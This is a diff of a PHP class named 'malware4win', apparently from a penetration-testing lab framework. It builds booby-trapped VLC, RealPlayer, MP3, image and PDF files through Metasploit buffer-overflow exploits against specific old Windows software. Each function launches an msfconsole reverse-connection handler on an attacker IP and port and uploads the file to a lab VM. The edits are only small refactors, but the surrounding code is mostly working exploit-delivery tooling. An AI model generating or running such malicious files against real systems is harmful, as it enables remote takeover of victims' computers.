@@ -46,7 +46,7 @@ class malware4win extends bin4win{
 	
 	public function bof2exp4app4local2vlc($filename){
 	    $vmx = new VM("xp3") ;
-	    $file = new FILE($filename);
+	    $file = new FILE($this->stream,$filename);
 	    // windows/vncinject/reverse_tcp
 	    // set LPORT $this->attacker_port;\
 	    // set AutoRunScript post/linux/gather/enum_system
@@ -64,7 +64,7 @@ class malware4win extends bin4win{
 	    system("mv -v /home/$this->user2local/.msf4/local/poc_vlc.s3m $file->file_path");
 	    $this->cmd("localhost","msfconsole -q -x \"use exploit/multi/handler;set RHOST $this->attacker_ip;set LPORT $this->attacker_port;run;\" ");
 	    $vmx->vm2upload($file->file_path, "$vmx->vm_tmp_win\\$file->file_ext" );
-	    //$file->file_file2virus2vt();
+	    //$file->file2virus2vt();
 	    
 	    return $file;
 	}
@@ -125,7 +125,7 @@ class malware4win extends bin4win{
 	public function bof2exp4app4local2realplayer($filename){
 	    $this->ssTitre("Real Player" );
 	    $vmx = new VM("xp3") ;
-	    $file = new FILE($filename);
+	    $file = new FILE($this->stream,$filename);
 	    
 	    $this->article("Vuln REALPLAYER VERSION","Windows XP SP3 / Real Player 15.0.5.109");
 	    
@@ -138,14 +138,14 @@ class malware4win extends bin4win{
 	    $this->requette("cp -v /home/$this->user2local/.msf4/local/$file->file_ext $file->file_path");
 	    $this->cmd("localhost","msfconsole -q -x \"use exploit/multi/handler;set RHOST $this->attacker_ip;set LPORT $this->attacker_port;run;\" ");
 	    $vmx->vm2upload($file->file_path, "$vmx->vm_tmp_win\\$file->file_ext" );
-	    //$file->file_file2virus2vt();
+	    //$file->file2virus2vt();
 	    return $file;
 	}
 	
 	public function bof2exp4app4local2mp3($filename){
 	    $this->ssTitre("MP3" );
 	    $vmx = new VM("xp3") ;
-	    $file = new FILE($filename);
+	    $file = new FILE($this->stream,$filename);
 	    
 	    $this->article("Vuln ABBS VERSION","Audio Media Player 3.1 / Windows XP SP3 / Windows 7 SP1");
 	    
@@ -158,14 +158,14 @@ class malware4win extends bin4win{
 	    $this->requette("cp -v /home/$this->user2local/.msf4/local/$file->file_ext $file->file_path");
 	    $this->cmd("localhost","msfconsole -q -x \"use exploit/multi/handler;set RHOST $this->attacker_ip;set LPORT $this->attacker_port;run;\" ");
 	    $vmx->vm2upload($file->file_path, "$vmx->vm_tmp_win\\$file->file_ext" );
-	    //$file->file_file2virus2vt();
+	    //$file->file2virus2vt();
 	    return $file;
 	}
 	
 	public function bof2exp4app4local2img($filename){
 	    $this->ssTitre("IMAGE" );
 	    $vmx = new VM("xp3") ;
-	    $file = new FILE($filename);
+	    $file = new FILE($this->stream,$filename);
 	    
 	    $this->article("Vuln CHASYS VERSION","Chasys Draw IES 4.10.01 / Windows XP SP3 / Windows 7 SP1");
 	    
@@ -177,14 +177,14 @@ class malware4win extends bin4win{
 	    $this->requette("cp -v /home/$this->user2local/.msf4/local/$file->file_ext $file->file_path");
 	    $this->cmd("localhost","msfconsole -q -x \"use exploit/multi/handler;set RHOST $this->attacker_ip;set LPORT $this->attacker_port;run;\" ");
 	    $vmx->vm2upload($file->file_path, "$vmx->vm_tmp_win\\$file->file_ext" );
-	    //$file->file_file2virus2vt();
+	    //$file->file2virus2vt();
 	    return $file;
 	}
 	
 	public function bof2exp4app4local2pdf($filename){
 	    $this->ssTitre("Fichier PDF" );
 	    $vmx = new VM($this->target_vmx_name) ;
-	    $file = new FILE($filename);
+	    $file = new FILE($this->stream,$filename);
 	    
 	    $this->article("Vuln PDF VERSION","Adobe Reader v8.1.1(Windows XP SP0-SP3 English)");
 	    
@@ -197,8 +197,8 @@ class malware4win extends bin4win{
 	    $this->requette("cp -v /home/$this->user2local/.msf4/local/$file->file_ext $file->file_path");
 	    $this->cmd("localhost","msfconsole -q -x \"use exploit/multi/handler;set RHOST $this->attacker_ip;set LPORT $this->attacker_port;run;\" ");
 	    $vmx->vm2upload($file->file_path, "$vmx->vm_tmp_win\\$file->file_ext" );
-	    //$file->file_file2virus2vt();
-	    $file->file_file2sandbox("cuckoo1");
+	    //$file->file2virus2vt();
+	    $file->file2sandbox("cuckoo1");
 	    return $file;
 	}
 	
